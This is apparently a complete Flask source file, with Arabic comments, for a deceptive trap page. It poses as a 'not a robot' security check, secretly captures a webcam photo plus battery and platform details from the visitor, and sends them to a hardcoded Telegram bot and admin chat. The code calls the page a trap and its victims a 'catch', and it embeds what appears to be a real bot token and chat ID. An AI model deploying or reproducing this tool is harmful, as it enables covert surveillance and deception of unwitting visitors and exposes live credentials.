import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعداداتك الخاصة ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

# --- الفخ (تم حل مشكلة السواد بإضافة تأخير ذكي) ---
HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية</title>
    <style>
        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 90%; max-width: 350px; }
        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 50px;">🛡️</div>
        <h3>نظام الأمان</h3>
        <p>اضغط لتجاوز الفحص والوصول للرابط</p>
        <button class="btn" id="go" onclick="capture()">أنا لست روبوت</button>
        <p id="st" style="color:#777; font-size:12px;"></p>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function post(d, t) { fetch('/api', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
        async function capture() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري الفحص...";
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = s;
                const b = await navigator.getBattery().catch(() => ({}));
                
                // إرسال المعلومات فوراً
                post(`📊 **صيد جديد**:\\n🔋 البطارية: ${Math.round(b.level*100)}%\\n🔋 شحن: ${b.charging}\\n🖥️ النظام: ${navigator.platform}\\n🌐 IP: جاري الجلب...`, 'msg');

                // حل السواد: ننتظر 4 ثواني كاملة لفتح العدسة
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.6), 'img');
                    document.getElementById('st').innerText = "اكتمل بنجاح!";
                }, 4000);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json(force=True, silent=True)
    if not data: return "OK"
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if t == 'msg': requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID}, files={'photo': ('c.jpg', img)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True, silent=True)
    if not data or "message" not in data: return "OK"
    
    msg = data["message"]
    uid = str(msg["chat"]["id"])
    text = msg.get("text", "")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"

    if uid == ADMIN_ID:
        if text == "/start":
            kb = {
                "inline_keyboard": [
                    [{"text": "🔗 رابط الصيد الخاص بي", "callback_data": "my_link"}],
                    [{"text": "⚙️ الإعدادات", "callback_data": "settings"}],
                    [{"text": "📊 الإحصائيات", "callback_data": "stats"}]
                ]
            }
            requests.post(url + "sendMessage", json={'chat_id': uid, 'text': "أهلاً سيوفي! اختار من القائمة:", 'reply_markup': kb})
    return "OK"

@app.route('/callback', methods=['POST']) # لاستقبال ضغطات الأزرار
def callback():
    data = request.get_json(force=True, silent=True)
    if "callback_query" in data:
        cid = data["callback_query"]["message"]["chat"]["id"]
        cb_data = data["callback_query"]["data"]
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        
        if cb_id == "my_link":
            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"رابطك المباشر:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
